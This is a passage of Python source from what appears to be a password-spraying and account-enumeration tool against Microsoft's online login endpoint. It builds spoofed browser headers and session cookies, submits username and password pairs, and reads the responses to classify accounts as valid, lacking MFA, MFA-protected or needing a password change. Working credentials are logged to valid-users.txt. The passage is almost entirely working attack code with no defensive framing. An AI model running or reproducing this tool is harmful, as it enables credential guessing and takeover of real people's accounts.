                    print(f"{BOLD_YELLOW}[!] Timeout occurred while connecting to {url_UserExsit}{RESET}")
                except httpx.RequestError as e:
                    print(f"{BOLD_YELLOW}[!] Request error: {e}{RESET}")
                except Exception:
                    print(f"{BOLD_YELLOW}[!] Unexpected error occurred while connecting to {url_UserExsit}{RESET}")
                    
                
                 #Final Request - POST with username and password:
                url_check_password = "https://login.microsoftonline.com/common/login"
                headers_check_password = {
                    "Host": "login.microsoftonline.com",
                    "Cache-Control": "max-age=0",
                    "Sec-Ch-Ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
                    "Sec-Ch-Ua-Mobile": "?0",
                    "Sec-Ch-Ua-Platform": '"Windows"',
                    "Accept-Language": "en-US,en;q=0.9",
                    "Origin": "https://login.microsoftonline.com",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-User": "?1",
                    "Sec-Fetch-Dest": "document",
                    "Priority": "u=0, i",
                }
    
                cookies_string = f"""{cookie_url11['name']}={cookie_url11['value']}&AADSSO=NA|NoExtension&SSOCOOKIEPULLED=1&{cookie_url12['name']}={cookie_url12['value']}&{cookie_url13['name']}={cookie_url13['value']}&{cookie_url14['name']}={cookie_url14['value']}&{cookie_url15['name']}={cookie_url15['value']}&{cookie_url21['name']}={cookie_url21['value']}&MicrosoftApplicationsTelemetryDeviceId=31776052-89f1-4caf-82a2-4ccf2a9b7f37"""
                cookies_check_password = dict(cookie.split("=", 1) for cookie in cookies_string.split("&"))
    
                canary = quote_plus(f"{canary}")
                ctx = quote_plus(f"{ctx}")
                flowToken = quote_plus(f"{flowtoken}")
                
                data_check_password = f"""login={username}&loginfmt={username}&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&canary={canary}&ctx={ctx}&flowToken={flowToken}"""  
                    
                
                try: 
                    try:
                        with httpx.Client(timeout=20, http2=True ) as client:
                            response_check_password = client.post(url_check_password, headers=headers_check_password, cookies=cookies_check_password, data=data_check_password)
                            cookies_dict = dict(response_check_password.cookies)
                            pageid = get_pageid_from_response(response_check_password.text)
                            if args.check:
                                if "ESTSAUTHPERSISTENT" in cookies_dict:
                                    if pageid == "ConvergedProofUpRedirect":
                                        print(f"{BOLD_GREEN}[✓] User {username} is exist, and seccessfully logged in with password: {password}{RESET}{BOLD_YELLOW} - MFA required but not configured {RESET}")
                                        with open("valid-users.txt", "a") as log_file:
                                            log_file.write(f"{username}:{password} - MFA required but not configured \n")
                                        break
                                    elif pageid == "ConvergedTFA":
                                        print(f"{BOLD_GREEN}[✓] User {username} is exist and Password {password} is correct - MFA required {RESET}")
                                        with open("valid-users.txt", "a") as log_file:
                                            log_file.write(f"{username}:{password} - MFA required \n")
                                        break
                                    else:
                                        print(f"{BOLD_GREEN}[✓] User {username} is exist, and seccessfully logged in with password: {password} {RESET}")
                                        with open("valid-users.txt", "a") as log_file:
                                            log_file.write(f"{username}:{password} \n")                                   
                                        break            
                                else:
                                    if pageid == "ConvergedChangePassword":
                                        print(f"{BOLD_GREEN}[✓] User {username} is exist and Password {password} is correct{RESET}{BOLD_YELLOW} - A new password is required to be set.{RESET}")
                                        with open("valid-users.txt", "a") as log_file:
                                            log_file.write(f"{username}:{password} - new password is required \n")
                                        break
                                    elif "<html><head><title>Working...</title></head>" in response_check_password.text:
                                        print(f"{BOLD_GREEN}[✓] User {username} is exist and Password {password} is correct, but there is a redirect to federation server{RESET}")
                                        with open("valid-users.txt", "a") as log_file:
                                            log_file.write(f"{username}:{password}\n")
                                        break
                                    else:
                                        print(f"{CYAN}[!] NOT-success: {username} exists, Failed to authenticate with password: {password}{RESET}")
                                        with open("valid-users.txt", "a") as log_file:
                                            log_file.write(f"{username}\n")
                                        break
                                        
                            else :
                                if "ESTSAUTHPERSISTENT" in cookies_dict:
                                    if pageid == "ConvergedProofUpRedirect":
                                        print(f"{BOLD_GREEN}[✓] Seccessfully logged in with {username} and password: {password}{RESET} {BOLD_YELLOW} - MFA is required but not configured {RESET}")
                                        with open("valid-users.txt", "a") as log_file:
                                            log_file.write(f"{username}:{password} - MFA required but not configured \n")
                                        break
                                    elif pageid == "ConvergedTFA":
                                        print(f"{BOLD_GREEN}[✓] User {username} is exist and Password {password} is correct, MFA is required {RESET}")
                                        with open("valid-users.txt", "a") as log_file:
                                            log_file.write(f"{username}:{password} - MFA required \n")
                                        break
                                    else:
                                        print(f"{BOLD_GREEN}[✓] User {username} is exist, and seccessfully logged in with password: {password} {RESET}")
                                        with open("valid-users.txt", "a") as log_file:
                                            log_file.write(f"{username}:{password} \n")                                   
                                        break                    
                                else:
                                    if pageid == "ConvergedChangePassword":
                                        print(f"{BOLD_GREEN}[✓]  User {username} is exist and Password {password} is correct{RESET}{BOLD_YELLOW} - A new password is required to be set.{RESET}")
                                        with open("valid-users.txt", "a") as log_file:
                                            log_file.write(f"{username}:{password} - new password is required \n")
                                        break
                                    elif "<html><head><title>Working...</title></head>" in response_check_password.text:
                                        print(f"{BOLD_GREEN}[✓] User {username} is exist and Password {password} is correct, but there is a redirect to federation server{RESET}")
                                        with open("valid-users.txt", "a") as log_file:
                                            log_file.write(f"{username}:{password}\n")
                                        break
                                    else:
                                        print(f"{BOLD_RED}[✗] Failed to authenticate with {username} with password {password}, didn't check if user exists{RESET}")   
    
                    except httpx.ReadTimeout:
                        print(f"{BOLD_YELLOW}[!] Request timed out while checking user: {username}{RESET}")
                        continue
    
                    except httpx.RequestError as e:
                        print(f"{BOLD_YELLOW}[!] Request error for {username}: {e}{RESET}")
                        continue
                   
                
                except httpx.ReadTimeout:
                    print(f"{BOLD_YELLOW}[!] Timeout occurred while connecting to {url_check_password}{RESET}")
                except httpx.RequestError as e:
                    print(f"{BOLD_YELLOW}[!] Request error: {e}{RESET}")
                except Exception:
                    print(f"{BOLD_YELLOW}[!] Unexpected error occurred while connecting to {url_check_password} {RESET}")



print("")
print("")           
print("----------------------------")
print(f"{CYAN} Valid users and successful authentications written to valid-users.txt {RESET}")
print("")
